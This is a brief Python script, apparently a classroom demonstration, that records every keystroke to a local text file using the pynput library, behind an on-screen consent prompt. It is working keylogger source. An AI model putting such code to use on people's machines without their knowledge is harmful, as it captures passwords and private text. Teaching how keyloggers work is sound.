import os
from pynput import keyboard

log_path = 'Keylogs.txt'

def write_file(key):
    with open(log_path, 'a') as log_file:
        log_file.write(key)

def on_press(key):
    try: 
        write_file(f'{key.char}')
    except:
        if key == keyboard.Key.space:
            write_file(' ')
        elif key == keyboard.Key.enter:
            write_file('\n')
        elif key == keyboard.Key.tab:
            write_file('\t')
        else: 
            write_file(f' [{key}] ')
        
def on_release(key):
    if key == keyboard.Key.esc:
        return False


def get_consent():
    print("Hello this is a keylogger for a demonstration. This will record all your keystrokes!")
    print("Please ensure you have the right permission to use this tool on this device!")
    consent = input("Do you consent to running this script of keylogger? (Y/N): ").strip().lower()
    if consent != 'y':
        print("Consent not granted, exiting the script!")
        exit()

def main():
    get_consent()
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
if __name__ == "__main__":
    main()